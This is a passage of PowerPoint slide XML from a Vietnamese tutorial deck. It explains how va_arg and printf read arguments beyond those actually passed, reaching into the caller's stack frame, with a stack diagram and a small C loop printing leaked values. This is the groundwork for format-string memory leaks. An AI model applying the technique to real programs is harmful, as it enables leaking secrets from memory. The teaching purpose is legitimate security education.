                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>cơ chế nào</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> để dừng khi nó đã lấy hết arguments trên stack.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Tức là nó sẽ tăng mãi mãi ...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="143" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm rot="2400">
            <a:off x="5258520" y="2287080"/>
            <a:ext cx="5940720" cy="4455360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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 name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="304920" y="228600"/>
            <a:ext cx="5862960" cy="6490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0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>                 ĐỊA CHỈ CAO</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STACK FRAME CỦA main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this_get_leak = 0x1338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 local variables khác của main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127622"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>│  Stack argument đầu tiên (nếu có)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Return address về main               │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Saved RBP của main  ◄── rbp_sum      │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STACK FRAME CỦA sum          │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this_not_leak = 0x1337               │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va_list fields:                      │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gp_offset = 8                      │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fp_offset = 0x30                   │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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> overflow_arg_area</a:t>
            </a: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reg_save_area = rbp_sum - 0xb0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Register save area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RSI = 10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RDX = 20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RCX = 30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total, i và các local variables khác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onsolas"/>
              </a:rPr>
              <a:t>                 ĐỊA CHỈ THẤP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="145" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="663120"/>
            <a:ext cx="6050880" cy="17550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1679" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Khi được va_arg request nhiều hơn số lượng thật sự được </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1679" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1679" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>truyền vào pointer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1679" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>overflow_arg_area</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1679" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> sẽ tiếp tục đi lên địa chỉ </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1679" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1679" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>stack cao hơn, tức là frame của caller là hàm main ở đây. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1679"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2040" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>=&gt; Ta có thể dùng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2040" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>BẤT KỲ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2040" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> giá trị nào </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2040" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>nằm trên stack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2040" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> của </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2040" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2040" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> main frame như một argument đưa vào format string</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2040" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="146" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm rot="1800">
            <a:off x="5573160" y="2418840"/>
            <a:ext cx="4026600" cy="4389120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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7" name="TextBox 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="304920" y="228600"/>
            <a:ext cx="5862960" cy="6488280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5266440" y="2260080"/>
            <a:ext cx="6048720" cy="2077920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="149" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057400" y="1279440"/>
            <a:ext cx="7777440" cy="3061800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="150" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="756720" y="228600"/>
            <a:ext cx="10442880" cy="6573240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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 name="TextBox 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="304920" y="228600"/>
            <a:ext cx="5862960" cy="6488280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5266440" y="2260080"/>
            <a:ext cx="6048720" cy="2077920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="153" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057400" y="1279440"/>
            <a:ext cx="7777440" cy="35179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100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> Với ví dụ trên nếu ta tiếp tục request tiếp qua</a:t>
            </a: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Arial"/>
              </a:rPr>
              <a:t> va_arg : </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pP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Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>for (int i = 0 ; i &lt; 20; i++) { </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>        printf("%p\n", va_arg(ap, int));</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>  }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US"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4" name="TextBox 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="304920" y="228600"/>
            <a:ext cx="5862960" cy="6488280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="155" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5266440" y="2260080"/>
            <a:ext cx="6048720" cy="2077920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="156" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="110520" y="605160"/>
            <a:ext cx="4814280" cy="26478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1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> Với ví dụ trên nêu ta tiếp tục request tiếp qua</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 va_arg : </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 for (int i = 0 ; i &lt; 20; i++) {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        printf("%p\n", va_arg(ap, int));</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  }</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Kết quả như sau : </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pic>
        <p:nvPicPr>
          <p:cNvPr id="157" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12186360" cy="6855480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="158" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4570920"/>
            <a:ext cx="2742840" cy="2058120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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9" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="3913200" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>Từ input call tới va_arg </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="TextBox 134"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10968480" cy="1969560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1143000"/>
            <a:ext cx="11334600" cy="3456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1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Vậy bản chất bên trong printf khi parse gặp các specifier như %p,%x,… nó sẽ call tới va_arg để tìm argument.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="162" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="638640" y="1705320"/>
            <a:ext cx="11247840" cy="3323160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>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3" name="TextBox 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="5389560" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>Vậy giờ ta chứng minh được gì  ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="TextBox 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10968480" cy="1970280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
